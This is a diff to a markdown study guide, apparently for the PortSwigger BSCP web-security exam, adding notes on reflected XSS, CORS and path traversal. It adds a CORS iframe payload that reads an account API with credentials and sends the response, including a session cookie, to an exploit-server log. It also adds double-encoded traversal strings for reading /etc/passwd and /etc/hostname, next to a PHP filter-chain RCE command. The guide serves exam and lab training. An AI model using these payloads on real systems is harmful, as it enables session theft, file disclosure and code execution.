@@ -478,7 +478,24 @@ location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location
 
 ### Reflected String XSS  
 
->Submitting a search string and reviewing the `source code` of the search result page, the JavaScript string variable is ***identified*** to reflect the search string in the code variable named ```searchTerms```.  
+>Submitting a search string and reviewing the `source code` of the search result page, the JavaScript string variable is ***identified*** to reflect the search string ```tracjer.gif``` in the `source code` variable named ```searchTerms```.  
+
+```html
+<section class=blog-header>
+<h1>0 search results for 'fuzzer'</h1>
+<hr>
+</section>
+<section class=search>
+	<form action=/ method=GET>
+		<input type=text placeholder='Search the blog...' name=term>
+		<button type=submit class=button>Search</button>
+    </form>
+    </section>
+	<script>
+    var searchTerms = 'fuzzer';
+    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+</script>
+```  
 
 ![JavaScript string with single quote and backslash escaped](images/javascript-string-reflection.png)  
 
@@ -1905,7 +1922,7 @@ X-Original-URL: /admin
   
 ## CORS  
 
->***Identify*** in the `source code` the account details are requested with AJAX request.  
+>***Identify*** in the `source code` the account details are requested with AJAX request and it contains the user session cookie in the response.  
 
 ![cors-ajax-request.png](images/cors-ajax-request.png)  
 
@@ -1929,6 +1946,21 @@ Origin: http://subdomain.TARGET.NET
 
 [PortSwigger Lab: CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)  
   
+>Payload that may work in BSCP exam on getting the administrator account api and session cookie logged on exploit server.  
+
+```html
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://0aee0024034c6237c3e99284006a0002.web-security-academy.net/account_api/?UnixTimestamp=1679134272000',true);
+    req.withCredentials = true;
+    req.send();
+    function reqListener() {
+        location='https://exploit-0a9e009703e062d9c365914c01700065.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
+    };
+</script>"></iframe>
+```  
+
 # Data Exfiltration  
 
 ## XXE Injections  
@@ -2478,8 +2510,9 @@ wrtz{{#with "s" as |string|}}
 3. Using URL-encoded ```..%252f..%252f..%252fetc/passwd``` payload can bypass application security controls.  
 4. Leading the beginning of the filename referenced with the original path and then appending ```/var/www/images/../../../etc/passwd``` payload at end bypasses the protection.  
 5. Using a **null** byte character at end plus an image extension to fool APP controls that an image is requested, this ```../../../etc/passwd%00.png``` payload succeed.  
-6. Windows OS accept both ```../``` and ```..\``` for directory traversal syntax, and as example retrieving ```/loadImage?filename=..\..\..\windows\win.ini``` on windows target to ***identify*** valid path traversal.  
-7. PHP Wrapper filter vulnerability allow traversal bypass to result in remote code execution (RCE) critical. Using [PHP filter chain generator](https://github.com/synacktiv/php_filter_chain_generator) to get your RCE without uploading a file if you control entirely the parameter passed to a require or an include in PHP! See [Tib3rius YouTube demo](https://youtu.be/OGjpTT6xiFI?t=1019) ```python php_filter_chain.generator.py --chain '<?=`$_GET[0]`; ?>' | tail -n 1 | urlencode``` 
+6. Double URL encode file path traversal, as example this `../../../../../../../../../../etc/hostname` will be URL double encoded as, `%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fhostname`.  
+7. Windows OS accept both `../` and `..\` for directory traversal syntax, and as example retrieving `loadImage?filename=..\..\..\windows\win.ini` on windows target to ***identify*** valid path traversal.  
+8. PHP Wrapper filter vulnerability allow traversal bypass to result in remote code execution (RCE) critical. Using [PHP filter chain generator](https://github.com/synacktiv/php_filter_chain_generator) to get your RCE without uploading a file if you control entirely the parameter passed to a require or an include in PHP! See [Tib3rius YouTube demo](https://youtu.be/OGjpTT6xiFI?t=1019) ```python php_filter_chain.generator.py --chain '<?=`$_GET[0]`; ?>' | tail -n 1 | urlencode``` 
   
 >Corresponding PortSwigger Directory traversal labs.  
 
@@ -2491,6 +2524,8 @@ wrtz{{#with "s" as |string|}}
 
 ![file-path-traversal-null-byte.png](images/file-path-traversal-null-byte.png)   
 
+>BSCP Exam challenge ***identified***, after obtaining admin session access, you can read `/etc/passwd` and `/etc/hostname` but as soon using same bypass file path traversal technique, the `home/carlos/secret` give response `403 Forbidden`.  
+   
 ### Admin Portal Files  
 
 >On the admin portal ***identify*** that the images are loaded using **imagefile=** parameter. Test if vulnerable to directory traversal. The imagefile parameter is vulnerable to directory traversal path attacks, enabling read access to arbitrary files on the server.  
